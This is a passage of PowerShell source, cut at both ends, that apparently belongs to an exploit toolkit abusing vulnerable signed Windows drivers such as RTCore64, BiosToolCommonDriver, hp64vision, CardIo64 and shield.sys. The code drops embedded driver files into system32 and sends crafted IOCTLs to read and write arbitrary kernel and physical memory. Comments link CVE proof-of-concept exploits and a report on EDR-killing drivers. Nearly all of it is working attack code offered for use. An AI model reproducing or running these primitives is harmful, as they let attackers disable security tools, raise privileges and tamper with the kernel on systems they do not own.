        Import-EmbeddedBlock -BlockName ControlCenter -OutPath 'C:\windows\system32\ControlCenter.sys' | Out-Null 
    }
    if (-not [File]::Exists("C:\windows\system32\PORTWELL.sys")) {
        Import-EmbeddedBlock -BlockName PORTWELL -OutPath 'C:\windows\system32\PORTWELL.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\HwRwDrv.sys")) {
        Import-EmbeddedBlock -BlockName HwRwDrv -OutPath 'C:\windows\system32\HwRwDrv.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\CardIo64.sys")) {
        Import-EmbeddedBlock -BlockName CardIo64 -OutPath 'C:\windows\system32\CardIo64.sys' | Out-Null
    }

    # 2. Translate VA -> PA
    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    $hDevice = Get-FileHandle -FileName $DevName -AlternativeName $AltName
    if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle." }

    $Result = [System.Collections.Generic.List[byte]]::new()

    # Define structural sizes dynamically to prevent out-of-bounds kernel overflows
    $HeaderSize = if ($Mode -eq 'CI') { 12 } else { 16 }

    try {
        # --- THE SYSTEM ---
        if ($TotalBytes -le 4) {
            # CASE 1: UP TO 4 BYTES -> Base 1 * Count
            $OutBuf = [Marshal]::AllocHGlobal($TotalBytes)
            
            if ($Mode -eq 'CI') {
                $InHeader = New-IntPtr -Size 12 -TypeSize ([Int32], [Int32], [Int32]) -Values ([Int32]$PA, 1, $TotalBytes)
            } else {
                $InHeader = New-IntPtr -Size 16 -TypeSize ([Int64], [Int32], [Int32]) -Values ($PA, 1, $TotalBytes)
            }

            # Fixed: $HeaderSize variable replaces hardcoded 16
            if (-not $NtApi::DeviceIoControl($hDevice, $Ioctl, $InHeader, $HeaderSize, $OutBuf, $TotalBytes, [IntPtr]::Zero, [IntPtr]::Zero)) { 
                throw "Case 1 read failed." 
            }

            $TempBytes = [byte[]]::new($TotalBytes)
            [Marshal]::Copy($OutBuf, $TempBytes, 0, $TotalBytes)
            $Result.AddRange($TempBytes)
            Free-IntPtr $InHeader -Method Auto; [Marshal]::FreeHGlobal($OutBuf)

        } else {
            # CASE 2: GREATER THAN 4 BYTES -> Base 4 * Count + Base 1 * Remainder
            $Offset = 0
            $Base4Bytes = $TotalBytes - ($TotalBytes % 4)

            # Phase A: Stride 4 loop (safely split into max 4096-byte chunks)
            while ($Offset -lt $Base4Bytes) {
                $Remaining4 = $Base4Bytes - $Offset
                $ChunkBytes = [Math]::Min(4096, $Remaining4)
                $ChunkCount = $ChunkBytes / 4

                if ($Mode -eq 'CI') {
                    $InHeader = New-IntPtr -Size 12 -TypeSize ([Int32], [Int32], [Int32]) -Values ([Int32]($PA + $Offset), 4, $ChunkCount)
                } else {
                    $InHeader = New-IntPtr -Size 16 -TypeSize ([Int64], [Int32], [Int32]) -Values (($PA + $Offset), 4, $ChunkCount)
                }
                $OutBuf = [Marshal]::AllocHGlobal($ChunkBytes)

                # Fixed: $HeaderSize variable replaces hardcoded 16
                if (-not $NtApi::DeviceIoControl($hDevice, $Ioctl, $InHeader, $HeaderSize, $OutBuf, $ChunkBytes, [IntPtr]::Zero, [IntPtr]::Zero)) { 
                    throw "Case 2 Base 4 read failed." 
                }

                $TempBytes = [byte[]]::new($ChunkBytes)
                [Marshal]::Copy($OutBuf, $TempBytes, 0, $ChunkBytes)
                $Result.AddRange($TempBytes)

                Free-IntPtr $InHeader -Method Auto; [Marshal]::FreeHGlobal($OutBuf)
                $Offset += $ChunkBytes
            }

            # Phase B: Direct 1-shot remainder cleanup (Base 1 * Remainder)
            $Remainder = $TotalBytes % 4
            if ($Remainder -gt 0) {
                # Fixed: Properly structured CardIo cleanup wrapper
                if ($Mode -eq 'CI') {
                    $InHeader = New-IntPtr -Size 12 -TypeSize ([Int32], [Int32], [Int32]) -Values ([Int32]($PA + $Offset), 1, $Remainder)
                } else {
                    $InHeader = New-IntPtr -Size 16 -TypeSize ([Int64], [Int32], [Int32]) -Values (($PA + $Offset), 1, $Remainder)
                }
                
                $OutBuf = [Marshal]::AllocHGlobal($Remainder)
                
                # Fixed: $HeaderSize variable replaces hardcoded 16
                if (-not $NtApi::DeviceIoControl($hDevice, $Ioctl, $InHeader, $HeaderSize, $OutBuf, $Remainder, [IntPtr]::Zero, [IntPtr]::Zero)) {
                    throw "Case 2 Remainder read failed." 
                }

                $TempBytes = [byte[]]::new($Remainder)
                [Marshal]::Copy($OutBuf, $TempBytes, 0, $Remainder)
                $Result.AddRange($TempBytes)

                Free-IntPtr $InHeader -Method Auto; [Marshal]::FreeHGlobal($OutBuf)
            }
        }

        # 4. Return formatted data types safely
        $AllBytes = $Result.ToArray()
        switch ($true) {
            $AsByte  { return $AllBytes[0] }
            $AsShort { return [BitConverter]::ToInt16($AllBytes, 0) }
            $AsInt   { return [BitConverter]::ToInt32($AllBytes, 0) }
            $AsLong  { return [BitConverter]::ToInt64($AllBytes, 0) }
            default  { return $AllBytes[0..($TotalBytes - 1)] }
        }
    } finally { 
        if ($hDevice) { Free-IntPtr $hDevice -Method NtHandle } 
    }
}
# hp64vision & CorMem [VA<>PA]
Function Read-PhysicalMemory {
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [switch]$AsByte, 
        [switch]$AsShort, 
        [switch]$AsInt,
        [switch]$AsLong
    )

    if (-not [File]::Exists("C:\windows\system32\BiosToolCommonDriver.sys")) {
        Import-EmbeddedBlock -BlockName BiosToolCommonDriver -OutPath 'C:\windows\system32\BiosToolCommonDriver.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\hp64vision.sys")) {
        Import-EmbeddedBlock -BlockName hp64vision -OutPath 'C:\windows\system32\hp64vision.sys' | Out-Null
    }

    # 1. ALWAYS translate the base VA to PA first using BiosToolCommonDriver
    if ($PA -eq 0L) {
        $hDevice = Get-FileHandle -FileName BiosToolCommonDriver -AlternativeName BiosToolCommonDriver
        if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle [Translation]." }
        $TransInPtr = New-IntPtr -Size 16 -TypeSize ([IntPtr], [Int64]) -Values ($VA, 0L)
        if (-not $NtApi::DeviceIoControl($hDevice, 0x222034, $TransInPtr, 16, $TransInPtr, 16, [IntPtr]::Zero, [IntPtr]::Zero)) { 
            Free-IntPtr $TransInPtr ; Free-IntPtr $hDevice -Method NtHandle
            throw "IOCTL Translation Call failed." 
        }
        $Status = [Marshal]::ReadInt32($TransInPtr, 0)
        $PA = [Marshal]::ReadInt64($TransInPtr, 8)
        Free-IntPtr $TransInPtr ; Free-IntPtr $hDevice -Method NtHandle
        if ($Status -ne 0) { return Write-Error ("Translation failed with driver status: 0x{0:X}" -f $Status) }
    }

    # 2. Connect to the target manipulation engine
    $hVision = Get-FileHandle -FileName 'hp64vision' -AlternativeName 'hpvision0' -Symbolic 'Device'
    if ($null -eq $hVision -or $hVision -eq 0) { return Write-Error "Invalid handle [hp64vision]." }

    try {
        # 3. Process 64-bit split reading purely via adjacent Physical Addresses (PA + 4)
        if ($AsLong) {
            $LowPart  = Send-RawPhysicalRead -hDevice $hVision -PhysicalAddress $PA -Size 4
            $HighPart = Send-RawPhysicalRead -hDevice $hVision -PhysicalAddress ($PA + 4) -Size 4

            $LowBytes  = [System.BitConverter]::GetBytes($LowPart)
            $HighBytes = [System.BitConverter]::GetBytes($HighPart)
            
            $FinalBytes = New-Object Byte[] 8
            [Array]::Copy($LowBytes, 0, $FinalBytes, 0, 4)
            [Array]::Copy($HighBytes, 0, $FinalBytes, 4, 4)

            return [System.BitConverter]::ToInt64($FinalBytes, 0)
        }

        # Process standard fixed widths
        $AccessSize = if ($AsByte) { 1 } elseif ($AsShort) { 2 } else { 4 }
        return Send-RawPhysicalRead -hDevice $hVision -PhysicalAddress $PA -Size $AccessSize
    } finally {
        if ($hVision) { Free-IntPtr $hVision -Method NtHandle }
    }
}
Function Send-RawPhysicalRead {
    param($hDevice, [Int64]$PA, [Int32]$Size)

    $PhysBytes = [System.BitConverter]::GetBytes($PA)
    $CleanPhysAddr = [System.BitConverter]::ToInt32($PhysBytes, 0)

    $InBuf = [Marshal]::AllocHGlobal(16)
    try {
        [Marshal]::WriteInt32($InBuf, 0, $CleanPhysAddr)
        [Marshal]::WriteInt32($InBuf, 4, 0)
        [Marshal]::WriteInt32($InBuf, 8, $Size)
        [Marshal]::WriteInt32($InBuf, 12, 0)

        if (-not $NtApi::DeviceIoControl($hDevice, 0x2200B0, $InBuf, 16, $InBuf, 16, [IntPtr]::Zero, [IntPtr]::Zero)) {
            throw "Physical read sequence rejected by driver engine."
        }

        return [Marshal]::ReadInt32($InBuf, 4)
    } finally {
        if ($InBuf) { [Marshal]::FreeHGlobal($InBuf) }
    }
}
# Phoenix 6c8a & CorMem: Read Primitive
Function Read-PhysicalAddress {
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,
        
        [ValidateRange(1, 4096)]
        [Int32]$Size = 4,

        [switch]$AsByte,
        [switch]$AsShort,
        [switch]$AsInt,
        [switch]$AsLong
    )

    if (-not [File]::Exists("C:\windows\system32\6C8A.sys")) {
        Import-EmbeddedBlock -BlockName 6C8A -OutPath 'C:\windows\system32\6C8A.sys' | Out-Null
    }

    if ($AsByte)   { $Size = 1 }
    if ($AsShort)  { $Size = 2 }
    if ($AsInt)    { $Size = 4 }
    if ($AsLong)   { $Size = 8 }

    if (-not [File]::Exists("C:\windows\system32\CorMem.sys")) {
        Import-EmbeddedBlock -BlockName CorMem -OutPath 'C:\windows\system32\CorMem.sys' | Out-Null 
    }

    # 2. Translate VA -> PA
    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    $hDevice = Get-FileHandle -FileName '6c8a' -AlternativeName 'TdkLib' -Symbolic 'Device'
    if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle." }

    try {
        $DataPtr    = New-IntPtr -Size $Size
        $TransInPtr = New-IntPtr -Size 8 -InitialValue $PA -UsePointerSize
        if (-not $NtApi::DeviceIoControl($hDevice, 0x222182, $TransInPtr, 8, $DataPtr, $Size, [IntPtr]::Zero, [IntPtr]::Zero)) { 
            throw "IOCTL Call failed." 
        }
        
        if ($AsByte)  { return [Marshal]::ReadByte($DataPtr) }
        if ($AsShort) { return [Marshal]::ReadInt16($DataPtr) }
        if ($AsInt)   { return [Marshal]::ReadInt32($DataPtr) }
        if ($AsLong)  { return [Marshal]::ReadInt64($DataPtr) }

        # Default fallback: Return raw byte array
        $OutputByteArray = [byte[]]::new($Size)
        [Marshal]::Copy($DataPtr, $OutputByteArray, 0, $Size)
        return $OutputByteArray
    }
    finally {
        # Deterministic disposal using your engine's tracking syntax
        if ($TransInPtr)  { New-IntPtr -Release -hHandle $TransInPtr }
        if ($DataPtr)     { New-IntPtr -Release -hHandle $DataPtr }
        if ($ReadInPtr)   { New-IntPtr -Release -hHandle $ReadInPtr }
        if ($hDevice)     { Free-IntPtr -handle $hDevice -Method NtHandle }
    }
}
# shield.sys, shield-async.sys, shieldwp.sys
Function Read-VirtualAddress {
    param (
        [IntPtr]$VA,
        [Int32]$BlockSize = 0x10,
        [switch]$AsByte,
        [switch]$AsShort,
        [switch]$AsInt,
        [switch]$AsLong
    )

    if (-not [File]::Exists("C:\windows\system32\shield.sys")) {
        Import-EmbeddedBlock -BlockName shield -OutPath 'C:\windows\system32\shield.sys' | Out-Null
    }

    # 1. Automatic size adjustment based on target data type switch
    if ($AsByte)   { $BlockSize = 1 }
    if ($AsShort)  { $BlockSize = 2 }
    if ($AsInt)    { $BlockSize = 4 }
    if ($AsLong)   { $BlockSize = 8 }

    $IOCTL = 0x96102014
    $Handle = Get-FileHandle -FileName 'shield' -AlternativeName 'EAZShield'
    if (-not $Handle) { throw "No handle" }

    $PacketSize = 0x450
    $DataPtr = New-IntPtr -Size $PacketSize

    try {
        # Initialize the buffer with zeros to clear out any garbage data
        for ($i = 0; $i -lt $PacketSize; $i++) {
            [Marshal]::WriteByte($DataPtr, $i, 0)
        }

        # Build packet matching driver expectations
        [Marshal]::WriteInt32($DataPtr, 0x00, $PacketSize)
        [Marshal]::WriteInt32($DataPtr, 0x04, 0x444D4377) # "wCMD"
        [Marshal]::WriteInt32($DataPtr, 0x08, 0xF0016)    # Sub-command (Src[2])
        
        # Write to offset 0x0A so *((unsigned __int16 *)Src + 5) evaluates to 15
        [Marshal]::WriteInt16($DataPtr, 0x0A, 15)
    
        # Set Operation to 1 for the READ path
        [Marshal]::WriteByte($DataPtr, 0x40, 1)           
        
        [Marshal]::WriteInt32($DataPtr, 0x44, $BlockSize) # Block size (Src[17])
        
        # Pass the Virtual Address directly
        [Marshal]::WriteInt64($DataPtr, 0x48, $VA.ToInt64()) 

        $bytesReturned = New-IntPtr -Size 8
        if (-not $NtApi::DeviceIoControl($Handle, $IOCTL, $DataPtr, $PacketSize, $DataPtr, $PacketSize, $bytesReturned, [IntPtr]::Zero)) {
            $LastError = [Marshal]::GetLastWin32Error()
            throw "IOCTL failed with Win32 Error Code: $LastError (0x{0:X})" -f $LastError
        }

        # 2. Extract raw data from the kernel return payload location
        $RawOutput = [IntPtr]::Add($DataPtr, 0x50)

        # 3. Dynamic Type Extraction
        if ($AsByte) {
            return [Marshal]::ReadByte($RawOutput)
        }
        elseif ($AsShort) {
            return [Marshal]::ReadInt16($RawOutput)
        }
        elseif ($AsInt) {
            return [Marshal]::ReadInt32($RawOutput)
        }
        elseif ($AsLong) {
            return [Marshal]::ReadInt64($RawOutput)
        }
        else {
            # Fallback default: Return the raw byte array if no specific switch was targeted
            $out = New-Object byte[] $BlockSize
            [Marshal]::Copy($RawOutput, $out, 0, $BlockSize)
            return $out
        }
    }
    finally { 
        Free-IntPtr -handle $DataPtr -Method Auto
        Free-IntPtr -handle $Handle -Method NtHandle 
    }
}
#endregion
#region Write
# RTcore
Function Write-Int8 {
    param(
        [IntPtr]$Address,
        [Int32]$Value,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        # 1. Initialize the structure natively in PowerShell
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_WRITE')
        $mr.BaseAddress = $Address
        $mr.Size = 1
        $mr.Value = $Value

        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        # 4. Send it over to the driver
        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle, 0x8000204C,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle

        # 6. Clean up memory allocations properly
        [Marshal]::FreeHGlobal($pMr)
        return $hr
    }

    return (
        Write-KernelMemory `
            -VA $Address `
            -Byte ([Byte]::Parse($Value))
    )
}
Function Write-Int16 {
    param(
        [IntPtr]$Address,
        [Int32]$Value,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        # 1. Initialize the structure natively in PowerShell
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_WRITE')
        $mr.BaseAddress = $Address
        $mr.Size = 2
        $mr.Value = $Value

        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        # 4. Send it over to the driver
        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle, 0x8000204C,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle
    

        # 6. Clean up memory allocations properly
        [Marshal]::FreeHGlobal($pMr)
        return $hr
    }

    return (
        Write-KernelMemory `
            -VA $Address `
            -Short ([Int16]::Parse($Value))
    )
}
Function Write-Int32 {
    param(
        [IntPtr]$Address,
        [Int32]$Value,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        # 1. Initialize the structure natively in PowerShell
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_WRITE')
        $mr.BaseAddress = $Address
        $mr.Size = 4
        $mr.Value = $Value

        # 2. Allocate clean unmanaged memory matching the structure size
        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        # 4. Send it over to the driver
        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle, 0x8000204C,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle
    

        # 6. Clean up memory allocations properly
        [Marshal]::FreeHGlobal($pMr)
        return $hr
    }

    return (
        Write-KernelMemory `
            -VA $Address `
            -Int $Value
    )
}
Function Write-Int64 {
    param(
        [IntPtr]$Address,
        [Int64]$Value,
        [Bool]$UseMap = $false
    )

    if ($UseMap) {
        
        initialize-RtCore

        # 1. Extract the lower 32 bits (bytes 0-3)
        $LowDword  = [Int32]($Value -band 0xFFFFFFFF)
    
        # 2. Shift right by 32 bits and extract the upper 32 bits (bytes 4-7)
        $HighDword = [Int32](($Value -shr 32) -band 0xFFFFFFFF)

        # 3. Write the lower 4 bytes to the base address
        $SuccessLow = Write-Int32 -Address $Address -Value $LowDword -UseMap $UseMap

        # 4. Write the upper 4 bytes to the base address + 4 bytes offset
        $TargetAddressHigh = [IntPtr]::Add($Address, 4)
        $SuccessHigh = Write-Int32 -Address $TargetAddressHigh -Value $HighDword -UseMap $UseMap

        # Return true if both halves were handled
        return ([bool]$SuccessLow -and [bool]$SuccessHigh)
    }

    return (
        Write-KernelMemory `
            -VA $Address `
            -Long $Value
    )
}
Function Write-IntPtr {
    param(
        [IntPtr]$Address,
        [IntPtr]$Value,
        [bool]$UseMap = $false
    )

    $RawValue = $Value.ToInt64()
    return Write-Int64 -Address $Address -Value $RawValue -UseMap $UseMap
}
# BiosToolCommonDriver, gibepext
function Write-KernelMemory {
    [CmdletBinding(DefaultParameterSetName = 'RawBytes')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [Parameter(Mandatory = $true, ParameterSetName = 'RawBytes')]
        [Byte[]]$Value,

        [Parameter(Mandatory = $true, ParameterSetName = 'Byte')]
        [Byte]$Byte,

        [Parameter(Mandatory = $true, ParameterSetName = 'Short')]
        [Int16]$Short,

        [Parameter(Mandatory = $true, ParameterSetName = 'Int')]
        [Int32]$Int,

        [Parameter(Mandatory = $true, ParameterSetName = 'Long')]
        [Int64]$Long,

        [ValidateSet('BiosToolCommonDriver', 'gibepext')]
        [string]$Mode = 'BiosToolCommonDriver'
    )

    switch ($PSCmdlet.ParameterSetName) {
        'Byte'  { $RawValue = [Byte[]]@($Byte) }
        'Short' { $RawValue = [BitConverter]::GetBytes($Short) }
        'Int'   { $RawValue = [BitConverter]::GetBytes($Int) }
        'Long'  { $RawValue = [BitConverter]::GetBytes($Long) }
        Default { $RawValue = $Value }
    }

    if ($Mode -eq 'gibepext') {
        $DriverName    = "GibEpExt"        
        $DriverNameAlt = "GibEpFirmware"  
        $TransIoctl    = 2285604 
        $MainIoctl     = 2285584
    } else {
        $DriverName    = "BiosToolCommonDriver"
        $DriverNameAlt = "BiosToolCommonDriver"
        $TransIoctl    = 0x222034
        $MainIoctl     = 0x222030
    }

    $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt
    if ($null -eq $hDevice -or $hDevice -eq 0) { 
        $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt -Symbolic 'Device'
        if ($null -eq $hDevice -or $hDevice -eq 0) { 
            return Write-Error "Invalid handle to $DriverName device."
        }
    }

    $Size             = $RawValue.Length
    $MainInOut        = $null
    $SourceUserBuffer = $null
    $BytesRet         = New-IntPtr -Size 8

    try {
        # STEP 1: TRANSLATE VIRTUAL ADDRESS TO PHYSICAL ADDRESS
        if ($PA -eq 0L) {
            if ($Mode -eq 'gibepext') {

                $buffer = New-Object byte[] 12
                [BitConverter]::GetBytes($VA.ToInt64()).CopyTo($buffer, 0)
            
                $crc = Get-KernelCustomHash ([byte[]]($buffer[0..7]))
                [BitConverter]::GetBytes([UInt32]$crc).CopyTo($buffer, 8)
                $MainInOut = New-IntPtr -Data $buffer
            
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 12, $MainInOut, 12, $BytesRet, [IntPtr]::Zero)) { 
                    $PA = Convert-VirtualToPhysical -VirtualAddress $VA
                } else {
                    $PA = [Marshal]::ReadInt64($MainInOut, 0)
                }
                if ($PA -eq 0) {
                    throw "Translation Fail." 
                }

            } else {

                $MainInOut = New-IntPtr -Size 16 -TypeSize ([IntPtr], [Int64]) -Values ($VA, 0L)
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 16, $MainInOut, 16, $BytesRet, [IntPtr]::Zero)) { 
                    $PA = Convert-VirtualToPhysical -VirtualAddress $VA
                } else {
                    $Status = [Marshal]::ReadInt32($MainInOut, 0)
                    if ($Status -ne 0) { return Write-Error ("Translation failed with driver status: 0x{0:X}" -f $Status) }
                    $PA = [Marshal]::ReadInt64($MainInOut, 8)
                }
                if ($PA -eq 0) {
                    throw "Translation Fail." 
                }
            }
        }

        # STEP 2: PACK PAYLOAD AND WRITE TO HARDWARE
        if ($Mode -eq 'gibepext') {
            $HeaderSize     = 12
            $OutputSize     = 8 
            $TotalInputSize = $HeaderSize + $Size + 4

            $ByteBuffer = New-Object byte[] $TotalInputSize
            $HighPart   = [Int64](($PA -band 0xFFFFFFFF00000000) -shr 32)
            $LowPart    = [Int64]($PA -band 0x00000000FFFFFFFF)
            [BitConverter]::GetBytes($HighPart).CopyTo($ByteBuffer, 0)   
            [BitConverter]::GetBytes($LowPart).CopyTo($ByteBuffer, 4)    
            [BitConverter]::GetBytes([Int32]$Size).CopyTo($ByteBuffer, 8) 
            [Buffer]::BlockCopy($RawValue, 0, $ByteBuffer, 12, $Size)
            
            $HashBuffer = New-Object byte[] ($HeaderSize + $Size)
            [Buffer]::BlockCopy($ByteBuffer, 0, $HashBuffer, 0, $HashBuffer.Length)
            $CalculatedHash = Get-KernelCustomHash -Data $HashBuffer
            [BitConverter]::GetBytes([UInt32]$CalculatedHash).CopyTo($ByteBuffer, ($HeaderSize + $Size))

            $MainInOut  = New-IntPtr -Data $ByteBuffer
            $ReadOutPtr = [Marshal]::AllocHGlobal($OutputSize)

            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, $TotalInputSize, $ReadOutPtr, $OutputSize, $BytesRet, [IntPtr]::Zero)) {
                throw "Physical write IOCTL call failed."
            }
        } else {
            $SourceUserBuffer = New-IntPtr -Data $RawValue
            $MainInOut = New-IntPtr -Size 24 -TypeSize ([Int32], [Int32], [IntPtr], [Int64]) -Values ($Size, 0, $SourceUserBuffer, $PA)

            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, 24, $MainInOut, 16, $BytesRet, [IntPtr]::Zero)) {
                return $false
            }
        }

        return $true
    
    } finally {
        Free-IntPtr -handle $MainInOut
        Free-IntPtr -handle $SourceUserBuffer
        Free-IntPtr -handle $ReadOutPtr
        Free-IntPtr -handle $BytesRet
        Free-IntPtr -handle $hDevice -Method NtHandle
    }
}
# ControlCenter, PORTWELL, HwRwDrv & CorMem [VA<>PA]
# MODAPI.sys (MSI Dragon Center) // http://github.com/rjt-gupta/CVE-2021-29337/blob/main/modapi_poc.c
# mydrivers64.sys (DriverGenius) // http://github.com/zeze-zeze/WindowsKernelVuln/blob/master/CVE-2023-1676/mydrivers64Exploit.cpp
# MegaDrov.sys                   // https://www.welivesecurity.com/en/eset-research/edr-killers-explained-beyond-the-drivers/
function Write-KernelAddress {
    [CmdletBinding(DefaultParameterSetName = 'RawBytes')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,
        [Parameter(Mandatory = $true, ParameterSetName = 'RawBytes')]
        [Byte[]]$Value,
        [Parameter(Mandatory = $true, ParameterSetName = 'Byte')]
        [Byte]$Byte,
        [Parameter(Mandatory = $true, ParameterSetName = 'Short')]
        [Int16]$Short,
        [Parameter(Mandatory = $true, ParameterSetName = 'Int')]
        [Int32]$Int,
        [Parameter(Mandatory = $true, ParameterSetName = 'Long')]
        [Int64]$Long,

        [ValidateSet("CC", "PW", "HW", "CI")]
        [String]$Mode = 'CC'
    )

    # Centralized Driver Configuration Table
    switch ($Mode) {
        'CC' {
            $Ioctl    = 0x9C40A108
            $DevName  = 'ControlCenter'
            $AltName  = 'CCDRV1'
        }
        'PW' {
            $Ioctl    = -362765228
            $DevName  = 'portwell'
            $AltName  = 'PORTWELL_0_1'
        }
        'CI' {
            $Ioctl    = 0x80102044
            $DevName  = 'CardIo64'
            $AltName  = 'CardIo'
        }
        Default {
            $Ioctl    = 0x9C40A0F8
            $DevName  = 'HwRwDrv'
            $AltName  = 'HwRwDrv'
        }
    }

    if (-not [File]::Exists("C:\windows\system32\CorMem.sys")) {
        Import-EmbeddedBlock -BlockName CorMem -OutPath 'C:\windows\system32\CorMem.sys' | Out-Null 
    }
    if (-not [File]::Exists("C:\windows\system32\ControlCenter.sys")) {
        Import-EmbeddedBlock -BlockName ControlCenter -OutPath 'C:\windows\system32\ControlCenter.sys' | Out-Null 
    }
    if (-not [File]::Exists("C:\windows\system32\PORTWELL.sys")) {
        Import-EmbeddedBlock -BlockName PORTWELL -OutPath 'C:\windows\system32\PORTWELL.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\HwRwDrv.sys")) {
        Import-EmbeddedBlock -BlockName HwRwDrv -OutPath 'C:\windows\system32\HwRwDrv.sys' | Out-Null
    }
    if (-not [File]::Exists("C:\windows\system32\CardIo64.sys")) {
        Import-EmbeddedBlock -BlockName CardIo64 -OutPath 'C:\windows\system32\CardIo64.sys' | Out-Null
    }

    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    # 2. Pack Serialization Parameters
    switch ($PSCmdlet.ParameterSetName) {
        'Byte'  { $Raw = [Byte[]]@($Byte); $Stride = 1 }
        'Short' { $Raw = [System.BitConverter]::GetBytes($Short); $Stride = 2 }
        'Int'   { $Raw = [System.BitConverter]::GetBytes($Int);   $Stride = 4 }
        'Long'  { $Raw = [System.BitConverter]::GetBytes($Long);  $Stride = 8 }
        Default { $Raw = $Value; $Stride = 1 }
    }

    $Count = $Raw.Length / $Stride

    # 3. Commit Direct Driver Write Payload
    $hDevice = Get-FileHandle -FileName $DevName -AlternativeName $AltName
    if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle." }
    
    try {
        if ($Mode -eq 'CI') {
            $HeaderSize = 12
            $BufSize = $HeaderSize + $Raw.Length
            
            # CardIo Struct: [Int32 Address] [Int32 Stride] [Int32 Count]
            $TxBuf = New-IntPtr -Size $BufSize -TypeSize ([Int32], [Int32], [Int32]) -Values ([Int32]$PA, $Stride, $Count)
        } else {
            $HeaderSize = 16
            $BufSize = $HeaderSize + $Raw.Length
            
            # Standard Struct: [Int64 Address] [Int32 Count] [Int32 Stride]
            $TxBuf = New-IntPtr -Size $BufSize -TypeSize ([Int64], [Int32], [Int32]) -Values ($PA, $Count, $Stride)
        }

        # Safely copy raw payload bytes directly after the calculated header offset
        [Marshal]::Copy($Raw, 0, [IntPtr]($TxBuf.ToInt64() + $HeaderSize), $Raw.Length)
